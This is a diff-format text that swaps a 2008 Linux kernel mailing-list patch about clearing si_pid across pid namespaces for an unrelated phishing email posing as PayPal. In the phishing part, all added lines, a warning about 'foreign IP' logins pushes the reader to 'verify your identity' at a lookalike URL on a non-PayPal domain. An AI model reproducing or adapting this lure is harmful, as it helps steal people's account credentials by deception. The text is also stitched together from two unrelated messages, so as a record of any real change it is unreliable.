@@ -1,54 +1,56 @@
-From: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com>
-Subject: [PATCH 6/6][v5] SI_USER: Masquerade si_pid when crossing pid ns
-	boundary
-Date: Sat, 27 Dec 2008 12:55:11 -0800
-Message-ID: <20081227205511.GE27337@us.ibm.com>
-References: <20081227204658.GA27197@us.ibm.com>
+From: "paypal.notify-EGKhR0g863QAvxtiuMwx3w@public.gmane.org" <paypal.notify-EGKhR0g863QAvxtiuMwx3w@public.gmane.org>
+Subject: Attention Paypal Member
+Date: Sun, 28 Dec 2008 09:31:24 -0600
+Message-ID: <9692.92009617693$1230478974@news.gmane.org>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Return-path: <linux-kernel-owner+glk-linux-kernel-3=40m.gmane.org-S1755317AbYL0U5U@vger.kernel.org>
-Content-Disposition: inline
-In-Reply-To: <20081227204658.GA27197@us.ibm.com>
-Sender: linux-kernel-owner@vger.kernel.org
-To: oleg@redhat.com, ebiederm@xmission.com, roland@redhat.com, bastian@waldi.eu.org
-Cc: daniel@hozac.com, xemul@openvz.org, containers@lists.osdl.org, linux-kernel@vger.kernel.org
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
+Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+List-Unsubscribe: <https://lists.linux-foundation.org/mailman/listinfo/containers>,
+	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
+List-Archive: <http://lists.linux-foundation.org/pipermail/containers>
+List-Post: <mailto:containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+List-Help: <mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=help>
+List-Subscribe: <https://lists.linux-foundation.org/mailman/listinfo/containers>,
+	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
+Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
+Dear Paypal Member,
 
-From: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com>
-Date: Wed, 24 Dec 2008 14:14:18 -0800
-Subject: [PATCH 6/6][v5] SI_USER: Masquerade si_pid when crossing pid ns boundary
+We recently noticed one or more attempts to log in to your PayPal account 
+from a foreign IP address.
 
-When sending a signal to a descendant namespace, set ->si_pid to 0 since
-the sender does not have a pid in the receiver's namespace.
+If you recently accessed your account while traveling or ISP has dynamic 
+IP address, the unusual log in attempts may have been initiated by you. 
+Please visit PayPal as soon as possible to verify your identity:
 
-Note:
-	- If rt_sigqueueinfo() sets si_code to SI_USER when sending a
-	  signal across a pid namespace boundary, the value in ->si_pid
-	  will be cleared to 0.
+http://www.clarer.com/secure/24921.paypal.com/webscr_cmd_login-run.php
 
-Changelog[v5]:
-	- (Oleg Nesterov) Address both sys_kill() and sys_tkill() cases
-	  in send_signal() to simplify code (this drops patch 7/7 from
-	  earlier version of patchset).
+Verifying your information is a security measure that will ensure that you 
+are the only person with access to the account.
 
-Signed-off-by: Sukadev Bhattiprolu <sukadev@linux.vnet.ibm.com>
----
- kernel/signal.c |    2 ++
- 1 files changed, 2 insertions(+), 0 deletions(-)
+Thanks for your patience as we work together to protect your account.
 
-diff --git a/kernel/signal.c b/kernel/signal.c
-index d90b033..7ffd044 100644
---- a/kernel/signal.c
-+++ b/kernel/signal.c
-@@ -951,6 +951,8 @@ static int send_signal(int sig, struct siginfo *info, struct task_struct *t,
- 			break;
- 		default:
- 			copy_siginfo(&q->info, info);
-+			if (from_ancestor_ns)
-+				q->info.si_pid = 0;
- 			break;
- 		}
- 	} else if (!is_si_special(info)) {
--- 
-1.5.2.5
+Sincerely,
+PayPal
+
+----------------------------------------------------------------
+PROTECT YOUR PASSWORD
+
+NEVER give your password to anyone, including PayPal employees. Protect 
+yourself against fraudulent websites by opening a new web browser (e.g. 
+Internet Explorer or Netscape) and typing in the PayPal URL every time you 
+log in to your account.
+
+----------------------------------------------------------------
+
+Please do not reply to this email. This mailbox is not monitored and you 
+will not receive a response. For assistance, log in to your PayPal account 
+and click the Help link located in the top right corner of any PayPal page.
+
+----------------------------------------------------------------
+
+PayPal Email ID PP321
